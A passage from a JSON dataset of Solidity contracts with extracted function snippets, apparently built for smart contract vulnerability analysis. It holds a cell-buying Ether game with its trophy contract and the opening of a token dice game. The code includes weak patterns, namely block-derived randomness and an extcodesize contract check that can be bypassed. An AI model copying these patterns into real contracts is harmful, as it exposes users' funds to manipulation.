newOwnerScoreAdjustment = DEFAULT_POINTS_PER_CELL;\n oldOwnerScoreAdjustment = oldOwnerScoreAdjustment.add(calculateNumberOfNeighbours(_cellId, _oldOwner).mul(POINTS_PER_NEIGHBOUR).mul(2));\n newOwnerScoreAdjustment = newOwnerScoreAdjustment.add(calculateNumberOfNeighbours(_cellId, _newOwner).mul(POINTS_PER_NEIGHBOUR).mul(2));\n if (_oldOwner == address(0)) {\n oldOwnerScoreAdjustment = 0;\n }\n return (scoreOf(_newOwner).add(newOwnerScoreAdjustment), scoreOf(_oldOwner).sub(oldOwnerScoreAdjustment));\n }\n function calculateNumberOfNeighbours(uint256 _cellId, address _address) internal view returns (uint256 _numberOfNeighbours) {\n uint256 numberOfNeighbours;\n (uint256 top, uint256 bottom, uint256 left, uint256 right) = getNeighbourhoodOf(_cellId);\n if (top != NUMBER_OF_CELLS && ownerOf(top) == _address) {\n numberOfNeighbours = numberOfNeighbours.add(1);\n }\n if (bottom != NUMBER_OF_CELLS && ownerOf(bottom) == _address) {\n numberOfNeighbours = numberOfNeighbours.add(1);\n }\n if (left != NUMBER_OF_CELLS && ownerOf(left) == _address) {\n numberOfNeighbours = numberOfNeighbours.add(1);\n }\n if (right != NUMBER_OF_CELLS && ownerOf(right) == _address) {\n numberOfNeighbours = numberOfNeighbours.add(1);\n }\n return numberOfNeighbours;\n }\n function getNeighbourhoodOf(uint256 _cellId) internal pure returns (uint256 _top, uint256 _bottom, uint256 _left, uint256 _right) {\n uint256 topCellId = NUMBER_OF_CELLS;\n if(_cellId >= NUMBER_OF_LINES){\n topCellId = _cellId.sub(NUMBER_OF_LINES);\n }\n uint256 bottomCellId = _cellId.add(NUMBER_OF_LINES);\n if (bottomCellId >= NUMBER_OF_CELLS) {\n bottomCellId = NUMBER_OF_CELLS;\n }\n uint256 leftCellId = NUMBER_OF_CELLS;\n if ((_cellId % NUMBER_OF_LINES) != 0) {\n leftCellId = _cellId.sub(1);\n }\n uint256 rightCellId = _cellId.add(1);\n if ((rightCellId % NUMBER_OF_LINES) == 0) {\n rightCellId = NUMBER_OF_CELLS;\n }\n return (topCellId, bottomCellId, leftCellId, rightCellId);\n }\n function _transfer(address _from, address _to, uint256 _cellId) internal {\n require(_cellId < NUMBER_OF_CELLS);\n require(ownerOf(_cellId) == _from);\n require(_to != address(0));\n require(_to != address(this));\n cells[_cellId].owner = _to;\n }\n function withdrawPot(string _message) public {\n require(!isContract(msg.sender));\n require(msg.sender != owner);\n require(rankOnePlayerAddress == msg.sender);\n require(isGameFinished());\n uint256 toWithdraw = potCut;\n potCut = 0;\n msg.sender.transfer(toWithdraw);\n TheEthGameTrophy trophy = TheEthGameTrophy(trophyAddress);\n trophy.award(msg.sender, _message);\n }\n function withdrawDevelopersCut () onlyOwner() public {\n uint256 toWithdraw = developersCut;\n developersCut = 0;\n owner.transfer(toWithdraw);\n }\n function withdrawEarnings () public {\n distributeEarningsBasedOnScore(msg.sender, address(0));\n distributeEarningsBasedOnNumberOfCells(msg.sender);\n uint256 toWithdraw = earningsOfPlayer();\n players[msg.sender].earnings = 0;\n msg.sender.transfer(toWithdraw);\n }\n function setName(bytes32 _name) public {\n if (nameToAddress[_name] != address(0)) {\n return;\n }\n players[msg.sender].name = _name;\n nameToAddress[_name] = msg.sender;\n }\n function nameOf(address _address) external view returns(bytes32 _name) {\n return players[_address].name;\n }\n function addressOf(bytes32 _name) external view returns (address _address) {\n return nameToAddress[_name];\n }\n function isContract(address addr) internal view returns (bool) {\n uint size;\n assembly { size := extcodesize(addr) }\n return size > 0;\n }\n}\ncontract TheEthGameTrophy {\n string public name;\n string public description;\n string public message;\n address public creator;\n address public owner;\n address public winner;\n uint public rank;\n bool private isAwarded = false;\n event Award(uint256 indexed _blockNumber, uint256 indexed _timestamp, address indexed _owner);\n event Transfer (address indexed _from, address indexed _to);\n constructor () public {\n name = \"The Eth Game Winner\";\n description = \"2019-08-17\";\n rank = 1;\n creator = msg.sender;\n }\n function name() constant public returns (string _name) {\n return name;\n }\n function description() constant public returns (string _description) {\n return description;\n }\n function message() constant public returns (string _message) {\n return message;\n }\n function creator() constant public returns (address _creator) {\n return creator;\n }\n function owner() constant public returns (address _owner) {\n return owner;\n }\n function winner() constant public returns (address _winner) {\n return winner;\n }\n function rank() constant public returns (uint _rank) {\n return rank;\n }\n function award(address _address, string _message) public {\n require(msg.sender == creator && !isAwarded);\n isAwarded = true;\n owner = _address;\n winner = _address;\n message = _message;\n emit Award(block.number, block.timestamp, _address);\n }\n function transfer(address _to) private returns (bool success) {\n require(msg.sender == owner);\n owner = _to;\n emit Transfer(msg.sender, _to);\n return true;\n }\n}",
  "extract_feature": [
    "function buy (uint256 _cellId, address _referreal) payable public {\nrequire(msg.value >= priceOf(_cellId));\nrequire(!isContract(msg.sender));\nrequire(_cellId < NUMBER_OF_CELLS);\nrequire(msg.sender != address(0));\nrequire(!isGameFinished());\nrequire(ownerOf(_cellId) != msg.sender);\nrequire(msg.sender != _referreal);\naddress oldOwner = ownerOf(_cellId);\naddress newOwner = msg.sender;\nuint256 price = priceOf(_cellId);\nuint256 excess = msg.value.sub(price);\nbool isReferrealDistributed = distributeToReferreal(price, _referreal);\nif (numberOfCellsBought > 0) {\nharmonicSum = harmonicSum.add(price.mul(NUMBER_OF_CELLS_PERCENTAGE) / (numberOfCellsBought * 100));\nif (isReferrealDistributed) {\ntotalScoreSum = totalScoreSum.add(price.mul(SCORE_PERCENTAGE) / (totalScore * 100));\n} else {\ntotalScoreSum = totalScoreSum.add(price.mul(SCORE_PERCENTAGE.add(REFERREAL_PERCENTAGE)) / (totalScore * 100));\n}\n}else{\npotCut = potCut.add(price.mul(NUMBER_OF_CELLS_PERCENTAGE.add(SCORE_PERCENTAGE)) / 100);\n}\nnumberOfCellsBought++;\ndistributeEarningsBasedOnNumberOfCells(newOwner);\nplayers[newOwner].numberOfCellsBought++;\nplayers[newOwner].numberOfCellsOwned++;\nif (ownerOf(_cellId) != address(0)) {\nplayers[oldOwner].numberOfCellsOwned--;\n}\nplayers[newOwner].lastCellBoughtOnBlockNumber = block.number;\naddress oldRankOnePlayer = rankOnePlayerAddress;\n(uint256 newOwnerScore, uint256 oldOwnerScore) = calculateScoresIfCellIsBought(newOwner, oldOwner, _cellId);\ndistributeEarningsBasedOnScore(newOwner, oldOwner);\ntotalScore = totalScore.sub(scoreOf(newOwner).add(scoreOf(oldOwner)));\nplayers[newOwner].score = newOwnerScore;\nplayers[oldOwner].score = oldOwnerScore;\ntotalScore = totalScore.add(scoreOf(newOwner).add(scoreOf(oldOwner)));\ncells[_cellId].price = nextPriceOf(_cellId);\nif (players[newOwner].numberOfCellsOwned == 1) {\nranking.push(newOwner);\n}\nif (oldOwner == rankOnePlayerAddress || (players[oldOwner].numberOfCellsOwned == 0 && oldOwner != address(0))) {\n(address rankOnePlayer, uint256 oldOwnerIndex) = getRankOnePlayer(oldOwner);\nif (players[oldOwner].numberOfCellsOwned == 0 && oldOwner != address(0)) {\ndelete ranking[oldOwnerIndex];\n}\nrankOnePlayerAddress = rankOnePlayer;\n}else{\nif (scoreOf(newOwner) >= scoreOf(rankOnePlayerAddress)) {\nrankOnePlayerAddress = newOwner;\n}\n}\nif (rankOnePlayerAddress != oldRankOnePlayer) {\nisFirstSinceBlock = block.number;\n}\ndevelopersCut = developersCut.add(price.mul(DEVELOPER_PERCENTAGE) / 100);\npotCut = potCut.add(price.mul(POT_PERCENTAGE) / 100);\n_transfer(oldOwner, newOwner, _cellId);\nemit Bought(oldOwner, newOwner);\nif (excess > 0) {\nnewOwner.transfer(excess);\n}\n}",
    "function getNumberOfBlocksRemainingToWin () public view returns (int256 _numberOfBlocks) {\nreturn int256(BLOCKS_TO_CONFIRM_TO_WIN_THE_GAME) - int256(block.number.sub(isFirstSinceBlock));\n}",
    "function award(address _address, string _message) public {\nrequire(msg.sender == creator && !isAwarded);\nisAwarded = true;\nowner = _address;\nwinner = _address;\nmessage = _message;\nemit Award(block.number, block.timestamp, _address);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b30"
  },
  "filename": "1702.sol",
  "content": "contract TheEthGameTrophy {\n string public name;\n string public description;\n string public message;\n address public creator;\n address public owner;\n address public winner;\n uint public rank;\n bool private isAwarded = false;\n event Award(uint256 indexed _blockNumber, uint256 indexed _timestamp, address indexed _owner);\n event Transfer (address indexed _from, address indexed _to);\n constructor () public {\n name = \"The Eth Game Winner\";\n description = \"2019-08-17\";\n rank = 1;\n creator = msg.sender;\n }\n function name() constant public returns (string _name) {\n return name;\n }\n function description() constant public returns (string _description) {\n return description;\n }\n function message() constant public returns (string _message) {\n return message;\n }\n function creator() constant public returns (address _creator) {\n return creator;\n }\n function owner() constant public returns (address _owner) {\n return owner;\n }\n function winner() constant public returns (address _winner) {\n return winner;\n }\n function rank() constant public returns (uint _rank) {\n return rank;\n }\n function award(address _address, string _message) public {\n require(msg.sender == creator && !isAwarded);\n isAwarded = true;\n owner = _address;\n winner = _address;\n message = _message;\n emit Award(block.number, block.timestamp, _address);\n }\n function transfer(address _to) private returns (bool success) {\n require(msg.sender == owner);\n owner = _to;\n emit Transfer(msg.sender, _to);\n return true;\n }\n}",
  "extract_feature": [
    "function award(address _address, string _message) public {\nrequire(msg.sender == creator && !isAwarded);\nisAwarded = true;\nowner = _address;\nwinner = _address;\nmessage = _message;\nemit Award(block.number, block.timestamp, _address);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b31"
  },
  "filename": "1703.sol",
  "content": "pragma solidity ^0.4.13;\nlibrary SafeMath {\n function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n if (_a == 0) {\n return 0;\n }\n c = _a * _b;\n assert(c / _a == _b);\n return c;\n }\n function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n return _a / _b;\n }\n function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n assert(_b <= _a);\n return _a - _b;\n }\n function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n c = _a + _b;\n assert(c >= _a);\n return c;\n }\n}\ncontract TheEthGame {\n using SafeMath for uint256;\n struct Player {\n uint256 score;\n uint256 lastCellBoughtOnBlockNumber;\n uint256 numberOfCellsOwned;\n uint256 numberOfCellsBought;\n uint256 earnings;\n uint256 partialHarmonicSum;\n uint256 partialScoreSum;\n address referreal;\n bytes32 name;\n }\n struct Cell {\n address owner;\n uint256 price;\n }\n address public owner;\n uint256 constant private NUMBER_OF_LINES = 6;\n uint256 constant private NUMBER_OF_COLUMNS = 6;\n uint256 constant private NUMBER_OF_CELLS = NUMBER_OF_COLUMNS * NUMBER_OF_LINES;\n uint256 constant private DEFAULT_POINTS_PER_CELL = 3;\n uint256 constant private POINTS_PER_NEIGHBOUR = 1;\n uint256 constant private CELL_STARTING_PRICE = 0.01 ether;\n uint256 constant private BLOCKS_TO_CONFIRM_TO_WIN_THE_GAME = 10000;\n uint256 constant private PRICE_INCREASE_PERCENTAGE = uint(2);\n uint256 constant private REFERREAL_PERCENTAGE = uint(10);\n uint256 constant private POT_PERCENTAGE = uint(30);\n uint256 constant private DEVELOPER_PERCENTAGE = uint(5);\n uint256 constant private SCORE_PERCENTAGE = uint(25);\n uint256 constant private NUMBER_OF_CELLS_PERCENTAGE = uint(30);\n Cell[NUMBER_OF_CELLS] cells;\n address[] private ranking;\n mapping(address => Player) players;\n mapping(bytes32 => address) nameToAddress;\n uint256 public numberOfCellsBought;\n uint256 private totalScore;\n uint256 private developersCut = 0 ether;\n uint256 private potCut = 0 ether;\n uint256 private harmonicSum;\n uint256 private totalScoreSum;\n address private rankOnePlayerAddress;\n uint256 private isFirstSinceBlock;\n address public trophyAddress;\n event Bought (address indexed _from, address indexed _to);\n constructor () public {\n owner = msg.sender;\n trophyAddress = new TheEthGameTrophy();\n }\n modifier onlyOwner() {\n require(owner == msg.sender);\n _;\n }\n function nextPriceOf (uint256 _cellId) public view returns (uint256 _nextPrice) {\n return priceOf(_cellId).mul(100 + PRICE_INCREASE_PERCENTAGE) / 100;\n }\n function priceOf (uint256 _cellId) public view returns (uint256 _price) {\n if (cells[_cellId].price == 0) {\n return CELL_STARTING_PRICE;\n }\n return cells[_cellId].price;\n }\n function earningsFromNumberOfCells (address _address) internal view returns (uint256 _earnings) {\n return harmonicSum.sub(players[_address].partialHarmonicSum).mul(players[_address].numberOfCellsBought);\n }\n function distributeEarningsBasedOnNumberOfCells (address _address) internal {\n players[_address].earnings = players[_address].earnings.add(earningsFromNumberOfCells(_address));\n players[_address].partialHarmonicSum = harmonicSum;\n }\n function earningsFromScore (address _address) internal view returns (uint256 _earnings) {\n return totalScoreSum.sub(players[_address].partialScoreSum).mul(scoreOf(_address));\n }\n function distributeEarningsBasedOnScore (address _newOwner, address _oldOwner) internal {\n players[_newOwner].earnings = players[_newOwner].earnings.add(earningsFromScore(_newOwner));\n players[_newOwner].partialScoreSum = totalScoreSum;\n if (_oldOwner != address(0)) {\n players[_oldOwner].earnings = players[_oldOwner].earnings.add(earningsFromScore(_oldOwner));\n players[_oldOwner].partialScoreSum = totalScoreSum;\n }\n }\n function earningsOfPlayer () public view returns (uint256 _wei) {\n return players[msg.sender].earnings.add(earningsFromScore(msg.sender)).add(earningsFromNumberOfCells(msg.sender));\n }\n function getRankOnePlayer (address _oldOwner) internal view returns (address _address, uint256 _oldOwnerIndex) {\n address rankOnePlayer;\n uint256 oldOwnerIndex;\n for (uint256 i = 0; i < ranking.length; i++) {\n if (scoreOf(ranking[i]) > scoreOf(rankOnePlayer)) {\n rankOnePlayer = ranking[i];\n } else if (scoreOf(ranking[i]) == scoreOf(rankOnePlayer) && players[ranking[i]].lastCellBoughtOnBlockNumber > players[rankOnePlayer].lastCellBoughtOnBlockNumber) {\n rankOnePlayer = ranking[i];\n }\n if (ranking[i] == _oldOwner) {\n oldOwnerIndex = i;\n }\n }\n return (rankOnePlayer, oldOwnerIndex);\n }\n function buy (uint256 _cellId, address _referreal) payable public {\n require(msg.value >= priceOf(_cellId));\n require(!isContract(msg.sender));\n require(_cellId < NUMBER_OF_CELLS);\n require(msg.sender != address(0));\n require(!isGameFinished());\n require(ownerOf(_cellId) != msg.sender);\n require(msg.sender != _referreal);\n address oldOwner = ownerOf(_cellId);\n address newOwner = msg.sender;\n uint256 price = priceOf(_cellId);\n uint256 excess = msg.value.sub(price);\n bool isReferrealDistributed = distributeToReferreal(price, _referreal);\n if (numberOfCellsBought > 0) {\n harmonicSum = harmonicSum.add(price.mul(NUMBER_OF_CELLS_PERCENTAGE) / (numberOfCellsBought * 100));\n if (isReferrealDistributed) {\n totalScoreSum = totalScoreSum.add(price.mul(SCORE_PERCENTAGE) / (totalScore * 100));\n } else {\n totalScoreSum = totalScoreSum.add(price.mul(SCORE_PERCENTAGE.add(REFERREAL_PERCENTAGE)) / (totalScore * 100));\n }\n }else{\n potCut = potCut.add(price.mul(NUMBER_OF_CELLS_PERCENTAGE.add(SCORE_PERCENTAGE)) / 100);\n }\n numberOfCellsBought++;\n distributeEarningsBasedOnNumberOfCells(newOwner);\n players[newOwner].numberOfCellsBought++;\n players[newOwner].numberOfCellsOwned++;\n if (ownerOf(_cellId) != address(0)) {\n players[oldOwner].numberOfCellsOwned--;\n }\n players[newOwner].lastCellBoughtOnBlockNumber = block.number;\n address oldRankOnePlayer = rankOnePlayerAddress;\n (uint256 newOwnerScore, uint256 oldOwnerScore) = calculateScoresIfCellIsBought(newOwner, oldOwner, _cellId);\n distributeEarningsBasedOnScore(newOwner, oldOwner);\n totalScore = totalScore.sub(scoreOf(newOwner).add(scoreOf(oldOwner)));\n players[newOwner].score = newOwnerScore;\n players[oldOwner].score = oldOwnerScore;\n totalScore = totalScore.add(scoreOf(newOwner).add(scoreOf(oldOwner)));\n cells[_cellId].price = nextPriceOf(_cellId);\n if (players[newOwner].numberOfCellsOwned == 1) {\n ranking.push(newOwner);\n }\n if (oldOwner == rankOnePlayerAddress || (players[oldOwner].numberOfCellsOwned == 0 && oldOwner != address(0))) {\n (address rankOnePlayer, uint256 oldOwnerIndex) = getRankOnePlayer(oldOwner);\n if (players[oldOwner].numberOfCellsOwned == 0 && oldOwner != address(0)) {\n delete ranking[oldOwnerIndex];\n }\n rankOnePlayerAddress = rankOnePlayer;\n }else{\n if (scoreOf(newOwner) >= scoreOf(rankOnePlayerAddress)) {\n rankOnePlayerAddress = newOwner;\n }\n }\n if (rankOnePlayerAddress != oldRankOnePlayer) {\n isFirstSinceBlock = block.number;\n }\n developersCut = developersCut.add(price.mul(DEVELOPER_PERCENTAGE) / 100);\n potCut = potCut.add(price.mul(POT_PERCENTAGE) / 100);\n _transfer(oldOwner, newOwner, _cellId);\n emit Bought(oldOwner, newOwner);\n if (excess > 0) {\n newOwner.transfer(excess);\n }\n }\n function distributeToReferreal (uint256 _price, address _referreal) internal returns (bool _isDstributed) {\n if (_referreal != address(0) && _referreal != msg.sender) {\n players[msg.sender].referreal = _referreal;\n }\n if (players[msg.sender].referreal != address(0)) {\n address ref = players[msg.sender].referreal;\n players[ref].earnings = players[ref].earnings.add(_price.mul(REFERREAL_PERCENTAGE) / 100);\n return true;\n }\n return false;\n }\n function getPlayers () external view returns(uint256[] _scores, uint256[] _lastCellBoughtOnBlock, address[] _addresses, bytes32[] _names) {\n uint256[] memory scores = new uint256[](ranking.length);\n address[] memory addresses = new address[](ranking.length);\n uint256[] memory lastCellBoughtOnBlock = new uint256[](ranking.length);\n bytes32[] memory names = new bytes32[](ranking.length);\n for (uint256 i = 0; i < ranking.length; i++) {\n Player memory p = players[ranking[i]];\n scores[i] = p.score;\n addresses[i] = ranking[i];\n lastCellBoughtOnBlock[i] = p.lastCellBoughtOnBlockNumber;\n names[i] = p.name;\n }\n return (scores, lastCellBoughtOnBlock, addresses, names);\n }\n function getCells () external view returns (uint256[] _prices, uint256[] _nextPrice, address[] _owner, bytes32[] _names) {\n uint256[] memory prices = new uint256[](NUMBER_OF_CELLS);\n address[] memory owners = new address[](NUMBER_OF_CELLS);\n bytes32[] memory names = new bytes32[](NUMBER_OF_CELLS);\n uint256[] memory nextPrices = new uint256[](NUMBER_OF_CELLS);\n for (uint256 i = 0; i < NUMBER_OF_CELLS; i++) {\n prices[i] = priceOf(i);\n owners[i] = ownerOf(i);\n names[i] = players[ownerOf(i)].name;\n nextPrices[i] = nextPriceOf(i);\n }\n return (prices, nextPrices, owners, names);\n }\n function getPlayer () external view returns (bytes32 _name, uint256 _score, uint256 _earnings, uint256 _numberOfCellsBought) {\n return (players[msg.sender].name, players[msg.sender].score, earningsOfPlayer(), players[msg.sender].numberOfCellsBought);\n }\n function getCurrentPotSize () public view returns (uint256 _wei) {\n return potCut;\n }\n function getCurrentWinner () public view returns (address _address) {\n return rankOnePlayerAddress;\n }\n function getNumberOfBlocksRemainingToWin () public view returns (int256 _numberOfBlocks) {\n return int256(BLOCKS_TO_CONFIRM_TO_WIN_THE_GAME) - int256(block.number.sub(isFirstSinceBlock));\n }\n function scoreOf (address _address) public view returns (uint256 _score) {\n return players[_address].score;\n }\n function ownerOf (uint256 _cellId) public view returns (address _owner) {\n return cells[_cellId].owner;\n }\n function isGameFinished() public view returns (bool _isGameFinished) {\n return rankOnePlayerAddress != address(0) && getNumberOfBlocksRemainingToWin() < 0;\n }\n function calculateScoresIfCellIsBought (address _newOwner, address _oldOwner, uint256 _cellId) internal view returns (uint256 _newOwnerScore, uint256 _oldOwnerScore) {\n uint256 oldOwnerScoreAdjustment = DEFAULT_POINTS_PER_CELL;\n uint256 newOwnerScoreAdjustment = DEFAULT_POINTS_PER_CELL;\n oldOwnerScoreAdjustment = oldOwnerScoreAdjustment.add(calculateNumberOfNeighbours(_cellId, _oldOwner).mul(POINTS_PER_NEIGHBOUR).mul(2));\n newOwnerScoreAdjustment = newOwnerScoreAdjustment.add(calculateNumberOfNeighbours(_cellId, _newOwner).mul(POINTS_PER_NEIGHBOUR).mul(2));\n if (_oldOwner == address(0)) {\n oldOwnerScoreAdjustment = 0;\n }\n return (scoreOf(_newOwner).add(newOwnerScoreAdjustment), scoreOf(_oldOwner).sub(oldOwnerScoreAdjustment));\n }\n function calculateNumberOfNeighbours(uint256 _cellId, address _address) internal view returns (uint256 _numberOfNeighbours) {\n uint256 numberOfNeighbours;\n (uint256 top, uint256 bottom, uint256 left, uint256 right) = getNeighbourhoodOf(_cellId);\n if (top != NUMBER_OF_CELLS && ownerOf(top) == _address) {\n numberOfNeighbours = numberOfNeighbours.add(1);\n }\n if (bottom != NUMBER_OF_CELLS && ownerOf(bottom) == _address) {\n numberOfNeighbours = numberOfNeighbours.add(1);\n }\n if (left != NUMBER_OF_CELLS && ownerOf(left) == _address) {\n numberOfNeighbours = numberOfNeighbours.add(1);\n }\n if (right != NUMBER_OF_CELLS && ownerOf(right) == _address) {\n numberOfNeighbours = numberOfNeighbours.add(1);\n }\n return numberOfNeighbours;\n }\n function getNeighbourhoodOf(uint256 _cellId) internal pure returns (uint256 _top, uint256 _bottom, uint256 _left, uint256 _right) {\n uint256 topCellId = NUMBER_OF_CELLS;\n if(_cellId >= NUMBER_OF_LINES){\n topCellId = _cellId.sub(NUMBER_OF_LINES);\n }\n uint256 bottomCellId = _cellId.add(NUMBER_OF_LINES);\n if (bottomCellId >= NUMBER_OF_CELLS) {\n bottomCellId = NUMBER_OF_CELLS;\n }\n uint256 leftCellId = NUMBER_OF_CELLS;\n if ((_cellId % NUMBER_OF_LINES) != 0) {\n leftCellId = _cellId.sub(1);\n }\n uint256 rightCellId = _cellId.add(1);\n if ((rightCellId % NUMBER_OF_LINES) == 0) {\n rightCellId = NUMBER_OF_CELLS;\n }\n return (topCellId, bottomCellId, leftCellId, rightCellId);\n }\n function _transfer(address _from, address _to, uint256 _cellId) internal {\n require(_cellId < NUMBER_OF_CELLS);\n require(ownerOf(_cellId) == _from);\n require(_to != address(0));\n require(_to != address(this));\n cells[_cellId].owner = _to;\n }\n function withdrawPot(string _message) public {\n require(!isContract(msg.sender));\n require(msg.sender != owner);\n require(rankOnePlayerAddress == msg.sender);\n require(isGameFinished());\n uint256 toWithdraw = potCut;\n potCut = 0;\n msg.sender.transfer(toWithdraw);\n TheEthGameTrophy trophy = TheEthGameTrophy(trophyAddress);\n trophy.award(msg.sender, _message);\n }\n function withdrawDevelopersCut () onlyOwner() public {\n uint256 toWithdraw = developersCut;\n developersCut = 0;\n owner.transfer(toWithdraw);\n }\n function withdrawEarnings () public {\n distributeEarningsBasedOnScore(msg.sender, address(0));\n distributeEarningsBasedOnNumberOfCells(msg.sender);\n uint256 toWithdraw = earningsOfPlayer();\n players[msg.sender].earnings = 0;\n msg.sender.transfer(toWithdraw);\n }\n function setName(bytes32 _name) public {\n if (nameToAddress[_name] != address(0)) {\n return;\n }\n players[msg.sender].name = _name;\n nameToAddress[_name] = msg.sender;\n }\n function nameOf(address _address) external view returns(bytes32 _name) {\n return players[_address].name;\n }\n function addressOf(bytes32 _name) external view returns (address _address) {\n return nameToAddress[_name];\n }\n function isContract(address addr) internal view returns (bool) {\n uint size;\n assembly { size := extcodesize(addr) }\n return size > 0;\n }\n}\ncontract TheEthGameTrophy {\n string public name;\n string public description;\n string public message;\n address public creator;\n address public owner;\n address public winner;\n uint public rank;\n bool private isAwarded = false;\n event Award(uint256 indexed _blockNumber, uint256 indexed _timestamp, address indexed _owner);\n event Transfer (address indexed _from, address indexed _to);\n constructor () public {\n name = \"The Eth Game Winner\";\n description = \"2019-08-17\";\n rank = 1;\n creator = msg.sender;\n }\n function name() constant public returns (string _name) {\n return name;\n }\n function description() constant public returns (string _description) {\n return description;\n }\n function message() constant public returns (string _message) {\n return message;\n }\n function creator() constant public returns (address _creator) {\n return creator;\n }\n function owner() constant public returns (address _owner) {\n return owner;\n }\n function winner() constant public returns (address _winner) {\n return winner;\n }\n function rank() constant public returns (uint _rank) {\n return rank;\n }\n function award(address _address, string _message) public {\n require(msg.sender == creator && !isAwarded);\n isAwarded = true;\n owner = _address;\n winner = _address;\n message = _message;\n emit Award(block.number, block.timestamp, _address);\n }\n function transfer(address _to) private returns (bool success) {\n require(msg.sender == owner);\n owner = _to;\n emit Transfer(msg.sender, _to);\n return true;\n }\n}",
  "extract_feature": [
    "function buy (uint256 _cellId, address _referreal) payable public {\nrequire(msg.value >= priceOf(_cellId));\nrequire(!isContract(msg.sender));\nrequire(_cellId < NUMBER_OF_CELLS);\nrequire(msg.sender != address(0));\nrequire(!isGameFinished());\nrequire(ownerOf(_cellId) != msg.sender);\nrequire(msg.sender != _referreal);\naddress oldOwner = ownerOf(_cellId);\naddress newOwner = msg.sender;\nuint256 price = priceOf(_cellId);\nuint256 excess = msg.value.sub(price);\nbool isReferrealDistributed = distributeToReferreal(price, _referreal);\nif (numberOfCellsBought > 0) {\nharmonicSum = harmonicSum.add(price.mul(NUMBER_OF_CELLS_PERCENTAGE) / (numberOfCellsBought * 100));\nif (isReferrealDistributed) {\ntotalScoreSum = totalScoreSum.add(price.mul(SCORE_PERCENTAGE) / (totalScore * 100));\n} else {\ntotalScoreSum = totalScoreSum.add(price.mul(SCORE_PERCENTAGE.add(REFERREAL_PERCENTAGE)) / (totalScore * 100));\n}\n}else{\npotCut = potCut.add(price.mul(NUMBER_OF_CELLS_PERCENTAGE.add(SCORE_PERCENTAGE)) / 100);\n}\nnumberOfCellsBought++;\ndistributeEarningsBasedOnNumberOfCells(newOwner);\nplayers[newOwner].numberOfCellsBought++;\nplayers[newOwner].numberOfCellsOwned++;\nif (ownerOf(_cellId) != address(0)) {\nplayers[oldOwner].numberOfCellsOwned--;\n}\nplayers[newOwner].lastCellBoughtOnBlockNumber = block.number;\naddress oldRankOnePlayer = rankOnePlayerAddress;\n(uint256 newOwnerScore, uint256 oldOwnerScore) = calculateScoresIfCellIsBought(newOwner, oldOwner, _cellId);\ndistributeEarningsBasedOnScore(newOwner, oldOwner);\ntotalScore = totalScore.sub(scoreOf(newOwner).add(scoreOf(oldOwner)));\nplayers[newOwner].score = newOwnerScore;\nplayers[oldOwner].score = oldOwnerScore;\ntotalScore = totalScore.add(scoreOf(newOwner).add(scoreOf(oldOwner)));\ncells[_cellId].price = nextPriceOf(_cellId);\nif (players[newOwner].numberOfCellsOwned == 1) {\nranking.push(newOwner);\n}\nif (oldOwner == rankOnePlayerAddress || (players[oldOwner].numberOfCellsOwned == 0 && oldOwner != address(0))) {\n(address rankOnePlayer, uint256 oldOwnerIndex) = getRankOnePlayer(oldOwner);\nif (players[oldOwner].numberOfCellsOwned == 0 && oldOwner != address(0)) {\ndelete ranking[oldOwnerIndex];\n}\nrankOnePlayerAddress = rankOnePlayer;\n}else{\nif (scoreOf(newOwner) >= scoreOf(rankOnePlayerAddress)) {\nrankOnePlayerAddress = newOwner;\n}\n}\nif (rankOnePlayerAddress != oldRankOnePlayer) {\nisFirstSinceBlock = block.number;\n}\ndevelopersCut = developersCut.add(price.mul(DEVELOPER_PERCENTAGE) / 100);\npotCut = potCut.add(price.mul(POT_PERCENTAGE) / 100);\n_transfer(oldOwner, newOwner, _cellId);\nemit Bought(oldOwner, newOwner);\nif (excess > 0) {\nnewOwner.transfer(excess);\n}\n}",
    "function getNumberOfBlocksRemainingToWin () public view returns (int256 _numberOfBlocks) {\nreturn int256(BLOCKS_TO_CONFIRM_TO_WIN_THE_GAME) - int256(block.number.sub(isFirstSinceBlock));\n}",
    "function award(address _address, string _message) public {\nrequire(msg.sender == creator && !isAwarded);\nisAwarded = true;\nowner = _address;\nwinner = _address;\nmessage = _message;\nemit Award(block.number, block.timestamp, _address);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b32"
  },
  "filename": "1714.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ZTHReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool);\n}\ncontract ZTHInterface {\n function getFrontEndTokenBalanceOf(address who) public view returns (uint);\n function transfer(address _to, uint _value) public returns (bool);\n function approve(address spender, uint tokens) public returns (bool);\n}\ncontract Zethroll is ZTHReceivingContract {\n using SafeMath for uint;\n modifier betIsValid(uint _betSize, uint _playerNumber) {\n require( calculateProfit(_betSize, _playerNumber) < maxProfit\n && _betSize >= minBet\n && _playerNumber > minNumber\n && _playerNumber < maxNumber);\n _;\n }\n modifier gameIsActive {\n require(gamePaused == false);\n _;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n uint constant private MAX_INT = 2 ** 256 - 1;\n uint constant public maxProfitDivisor = 1000000;\n uint constant public maxNumber = 99;\n uint constant public minNumber = 2;\n uint constant public houseEdgeDivisor = 1000;\n bool public gamePaused;\n address public owner;\n address public ZethrBankroll;\n address public ZTHTKNADDR;\n ZTHInterface public ZTHTKN;\n uint public contractBalance;\n uint public houseEdge;\n uint public maxProfit;\n uint public maxProfitAsPercentOfHouse;\n uint public minBet = 0;\n uint public totalBets;\n uint public totalZTHWagered;\n event LogBet(address sender, uint value, uint rollUnder);\n event LogResult(address player, uint result, uint rollUnder, uint profit, uint tokensBetted, bool won);\n event LogOwnerTransfer(address indexed SentToAddress, uint indexed AmountTransferred);\n event MaxProfitChanged(uint _oldMaxProfit, uint _newMaxProfit);\n event CurrentContractBalance(uint _tokens);\n constructor (address zthtknaddr, address zthbankrolladdr) public {\n owner = msg.sender;\n ZTHTKN = ZTHInterface(zthtknaddr);\n ZTHTKNADDR = zthtknaddr;\n ZethrBankroll = zthbankrolladdr;\n houseEdge = 990;\n ownerSetMaxProfitAsPercentOfHouse(10000);\n ownerSetMinBet(1e18);\n ZTHTKN.approve(zthbankrolladdr, MAX_INT);\n }\n function() public payable {}\n function maxRandom(uint blockn, address entropy) public view returns (uint256 randomNumber) {\n return 